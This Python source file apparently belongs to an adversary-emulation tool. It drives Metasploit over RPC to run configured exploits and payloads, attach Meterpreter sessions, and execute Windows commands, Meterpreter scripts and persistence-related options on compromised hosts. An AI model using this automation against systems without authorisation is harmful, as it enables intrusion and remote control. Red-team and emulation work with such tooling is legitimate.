from pymetasploit3.msfconsole import MsfRpcConsole
from pymetasploit3.msfrpc import MsfRpcClient
import time
import collections
import threading
from colorama import Fore, Style, init
import logging


class MetasploitEnv(object):

    def __init__(self,**kwargs):

        self.connection_made = True
        self.client = None
        self.conf = None
        self.attacks = {}
        self.in_progress_scenario = None
        self.SESSION_ID = None
        self.SESSION = None
        self.options = {}
        self.cid = 0
        self.shell = None
        self.exploit = None
        self.payload = None
        self.conf = kwargs["conf_obj"]
        self.session_recorder = logging.getLogger(self.conf.get_dyanamic_property("session_id", category="session"))
        self.thread_controller_obj = kwargs["thread_controller_obj"]
        
        init()

    def initialize_variables(self, **kwargs):
        self.in_progress_scenario = kwargs["in_prg_scenario"]
        self.attacks = kwargs["attks"]
        self.script_delay = int(
            self.conf.get_attack_options("script_delay"))
        self.current_tactic = self.conf.get_dyanamic_property("current_tactic", category="session")

    def connect_metasploit(self):
        try:

            self.client = MsfRpcClient('pass', port=55552)
            self.connection_made = True
        except:
            self.session_recorder.critical("Connection Error: Please check Metasploit connection")
            self.connection_made = False

    # todo: for setOptions we can set the variables (Like LHOST etc) on program start. (I think done in configuration class)
    def initial_metasploit(self):

        self.set_metasploit_env()

        if (not self.connection_made):
            return

        else:
            # self.thread_check =
            if("separate-thread" in self.attacks[self.in_progress_scenario] and self.attacks[self.in_progress_scenario]["separate-thread"] == "yes"):
                self.session_recorder.info("Starting Another Thread")
                self.metsploit_thread = threading.Thread(
                    target=self.control_handler, name="metasploit-thread")
                self.metsploit_thread.start()
                self.thread_controller_obj.register_threads(self.conf.get_dyanamic_property("current_step", category="common"),self.metsploit_thread)
                time.sleep(self.script_delay)
            else:
                self.control_handler()

    def control_handler(self):
        self.loop = True
        while (self.loop):
            
            self.loop = False
            Fore.YELLOW
            self.session_recorder.info("....................Executing Exploit......................................")
            Style.RESET_ALL
            self.SESSION = self.exploit.execute(payload=self.payload)
            self.session_recorder.info(self.SESSION)
            self.loop = self.metasploit_shell_handling()

        Fore.YELLOW
        self.session_recorder.info("....................Meterpreter Session List...............................")
        Style.RESET_ALL
        self.session_recorder.info(self.client.sessions.list)
        self.session_recorder.info("....................Connected Meterpreter Session Id: " +
              self.SESSION_ID + "....................")
        Style.RESET_ALL
        self.shell = self.client.sessions.session(self.SESSION_ID)

    def metasploit_shell_handling(self):
            count = 0

            while(True):
            
                if(not self.client.sessions.list):      # if sessions are empty
                    self.session_recorder.info("Meterpreter Sessions list empty: " +
                          str(self.client.sessions.list))

                else:                                   # is session is not empty, then find appropriate session
                    for sess_keys in self.client.sessions.list:
                        self.session_recorder.info("Meterpreter Sessions " +
                          str(self.client.sessions.list))
                        if (self.client.sessions.list[sess_keys]['exploit_uuid'] == self.SESSION['uuid']):
                            self.SESSION_ID = sess_keys
                            self.session_recorder.info(
                                "Meterpreter Session found in list!, with ID = " + self.SESSION_ID)
                            return False

                        # else:
                        #     self.session_recorder.info(
                        #         "Meterpreter Session not found in list! connecting to ghost Session")
                        #     self.Ordered_Sessions_list = collections.OrderedDict(
                        #         self.client.sessions.list)
                        #     self.SESSION_ID = list(
                        #         self.Ordered_Sessions_list.keys())[-1]
                        #     return False

                time.sleep(3)
                count += 1
                if(count >= 5):
                    
                    if self.attacks[self.in_progress_scenario]["spawn_seperate_session"] == True:
                        
                        if( self.current_tactic == "Initial_Access"):
                            if ("type" in self.attacks[self.in_progress_scenario]):
                                count = 0
                                self.type = self.attacks[self.in_progress_scenario]["type"]
                                if(self.type == "listener"):
                                    self.session_recorder.info("Do not re-execute: its just a listener!!!")

                                else:
                                    self.session_recorder.info(
                                        ".........Executing Exploit again (this part shouldn't reach, check json file)..........\n")
                                    return True
                            else:
                                self.session_recorder.info(
                                        ".........Executing Exploit again..........\n")
                                return True
                        else:
                            self.session_recorder.info(
                                        ".........Executing Exploit again..........\n")
                            return True
                                

                    # elif(self.current_tactic== "Privilege_Escalation"):
                    #         #TODO: check if job_id is not NONE
                    
                    else:
                        self.session_recorder.info(
                            "Local exploit executed, re-attaching previous session")
                        return False

                    # else:
                    #     Fore.YELLOW
                    #     self.session_recorder.warning(
                    #           "....................Executing Exploit again....................")
                    #     Style.RESET_ALL
                    #     return True


    def execute_windows_command(self, cmd):

        def exec_windows_command_thread():
            Fore.YELLOW
            self.session_recorder.info("....................Executing Winows Command........................")
            Style.RESET_ALL
            time.sleep(self.script_delay)
            self.session_recorder.info(self.shell.run_shell_cmd_with_output(
                cmd, None, exit_shell=False))

        self.windows_command_thread = threading.Thread(
            target=exec_windows_command_thread, name="windows_command_thread")
        self.windows_command_thread.start()
        self.thread_controller_obj.register_threads(self.conf.get_dyanamic_property("current_step", category="common"),self.windows_command_thread)
        self.wait_count = 0
        self.terminate_count = 0

        while(True):
            time.sleep(self.script_delay)

            if(self.terminate_count >= 3):
                self.session_recorder.critical(
                    "Teminating Command Execution: Some Problem ocurred in windows command execution")
                # self.thread_controller_obj.raise_exception(self.windows_command_thread)
                self.thread_controller_obj.unregister_and_stop_thread(self.conf.get_dyanamic_property("current_step", category="common"))
                self.windows_command_thread.join()
                break

            elif(self.wait_count >= 5):
                self.session_recorder.error("Command took too long, Terminating Thread " +
                      self.windows_command_thread.name)
                # self.thread_controller_obj.raise_exception(self.windows_command_thread)
                self.thread_controller_obj.unregister_and_stop_thread(self.conf.get_dyanamic_property("current_step", category="common"))
                self.windows_command_thread.join()
                self.session_recorder.info("executing windows command thread again")
                self.windows_command_thread = threading.Thread(
                        target=exec_windows_command_thread, name="windows_command_thread")
                self.windows_command_thread.start()
                self.thread_controller_obj.register_threads(self.conf.get_dyanamic_property("current_step",  category="common"),self.windows_command_thread)
                self.terminate_count += 1
                self.wait_count = 0

            elif self.windows_command_thread.is_alive() is False:
                self.session_recorder.info("Command Executed")
                break

            else:
                self.session_recorder.info("Waiting for Execution")
                self.wait_count += 1



    def execute_meterpreter_script(self, script):

        Fore.YELLOW
        self.session_recorder.info("....................Executing Meterpreter Script.........................")
        Style.RESET_ALL
        time.sleep(self.script_delay)
        self.shell.runscript(script)
        time.sleep(self.script_delay)
        self.session_recorder.info("Execution Completed")

    def execute_meterpreter_command(self, command):

        Fore.YELLOW
        self.session_recorder.info("....................Executing Meterpreter Command...............................")
        Style.RESET_ALL
        self.session_recorder.info(self.shell.run_with_output(
            command, timeout=10, timeout_exception=False))
        # self.session_recorder.info(self.shell.run read())

    def set_module(self, m_type, m_name):

        if (m_type == 'exploit' or m_type =='post'):
            self.exploit = self.client.modules.use(m_type, m_name)
            return

        if (m_type == 'payload'):
            self.payload = self.client.modules.use(m_type, m_name)
            return

    def set_exploit_options(self):

        # self.session_recorder.info("options are "+str(self.options))
        for opt in self.options:
            if opt == 'RHOSTS':
                try:
                    self.exploit['RHOSTS'] = self.conf.get_dyanamic_property(
                        "RHOSTS", "common_tactic")
                except:
                    self.session_recorder.info("exploit['RHOSTS'] not needed...")

            elif opt == 'LHOST':
                try:
                    self.exploit['LHOST'] = self.conf.get_network_options(
                        "LHOST")
                except:
                    self.session_recorder.info("exploit['LHOST'] not needed...")

            elif opt == 'LPORT':
                try:
                    self.exploit['LPORT'] = self.conf.get_dyanamic_property(
                        self.options[opt])
                except:
                    self.session_recorder.info("exploit['LPORT'] not needed...")

            elif opt == 'RPORT':
                try:
                    self.exploit['RPORT'] = self.options[opt]
                except:
                    self.session_recorder.info("exploit['LPORT'] not needed...")

            elif opt == 'TARGETURI':
                try:
                    self.exploit['TARGETURI'] = self.options[opt]
                except:
                    self.session_recorder.info("exploit['TARGETURI'] not needed...")

            elif opt == 'TARGET':
                try:
                    self.session_recorder.info(self.exploit._target)
                    self.exploit.target = int(self.options[opt])
                except:
                    self.session_recorder.info("exploit['TARGET'] not needed...")

            elif opt == 'SESSION':
                try:

                    self.exploit['SESSION'] = int(self.SESSION_ID)
                except:
                    self.session_recorder.info("exploit['SESSION'] not needed...")

            elif opt == 'SERVICE_NAME':
                try:
                    self.exploit['SERVICE_NAME'] = self.conf.get_dyanamic_property(
                        self.options[opt])
                except:
                    self.session_recorder.info("exploit['SERVICE_NAME'] not needed...")
            elif opt == 'REMOTE_EXE_NAME':
                try:
                    self.exploit['REMOTE_EXE_NAME'] = self.conf.get_dyanamic_property(
                        self.options[opt])
                except:
                    self.session_recorder.info("exploit['REMOTE_EXE_NAME'] not needed...")
            elif opt == 'REMOTE_EXE_PATH':
                try:
                    b = self.conf.get_dyanamic_property(
                        self.options[opt])
                    print(b)
                    self.exploit['REMOTE_EXE_PATH'] = b
                except:
                    self.session_recorder.info("exploit['REMOTE_EXE_PATH'] not needed...")
            elif opt == 'REXEPATH':
                try:
                    self.exploit['REXEPATH'] = self.conf.get_dyanamic_property(
                        self.options[opt])
                except:
                    self.session_recorder.info("exploit['REXEPATH'] not needed...")
            elif opt == 'REXENAME':
                try:
                    a = self.conf.get_dyanamic_property(
                        self.options[opt])
                    print(a)
                    self.exploit['REXENAME'] = a
                except:
                    self.session_recorder.info("exploit['REXENAME'] not needed...")
            elif opt == 'STARTUP':
                try:
                    self.exploit['STARTUP'] = self.options[opt]
                except:
                    self.session_recorder.info("exploit['STARTUP'] not needed...")
            elif opt == 'BLOB_REG_NAME':
                try:
                    self.exploit['BLOB_REG_NAME'] = self.conf.get_dyanamic_property(
                        self.options[opt])
                except:
                    self.session_recorder.info("exploit['BLOB_REG_NAME'] not needed...")
            elif opt == 'RUN_NAME':
                try:
                    self.exploit['RUN_NAME'] = self.conf.get_dyanamic_property(
                        self.options[opt])
                except:
                    self.session_recorder.info("exploit['RUN_NAME'] not needed...")


            else:
                self.session_recorder.info("option not found in exploits")

    def set_payload_options(self):

        for opt in self.options:

            if opt == 'LHOST':
                try:
                    self.payload['LHOST'] = self.conf.get_network_options(
                        "LHOST")
                except:
                    self.session_recorder.info("payload['LHOST'] not needed...")

            elif opt == 'LPORT':
                try:
                    self.payload['LPORT'] = self.conf.get_dyanamic_property(
                        self.options[opt]) #"LPORT")
                except:
                    self.session_recorder.info("payload['LPORT'] not needed...")

            else:
                self.session_recorder.info("option not found in payloads")

    def set_metasploit_env(self):

        self.connect_metasploit()
        if (not self.connection_made):
            return
        try:
            self.set_module(
                'exploit', self.attacks[self.in_progress_scenario]['exploit'])
        except:
            self.session_recorder.info("exploit not needed")
        try:
            self.set_module(
                'post', self.attacks[self.in_progress_scenario]['post'])
        except:
            self.session_recorder.info("post not needed")
        try:
            self.set_module(
                'payload', self.attacks[self.in_progress_scenario]['payload'])
        except:
            self.session_recorder.info("payload not needed")
        try:
            self.options = self.attacks[self.in_progress_scenario]['options']
            self.set_exploit_options()
            self.set_payload_options()
        except:
            self.session_recorder.info("no options required")

        self.cid = self.client.consoles.console().cid
        self.session_recorder.info("cid: "+self.cid)

    def destroy_env(self):
        Fore.YELLOW
        self.session_recorder.info("....................Destroying Session.....................................")
        Style.RESET_ALL
        try:
            self.shell.detach()
            time.sleep(self.script_delay)
            self.shell.stop()
            time.sleep(self.script_delay)
            self.client.consoles.console(self.cid).destroy
        except:
            Fore.YELLOW
            self.session_recorder.info(
                  "....................No Session available to destroy........................")
            Style.RESET_ALL
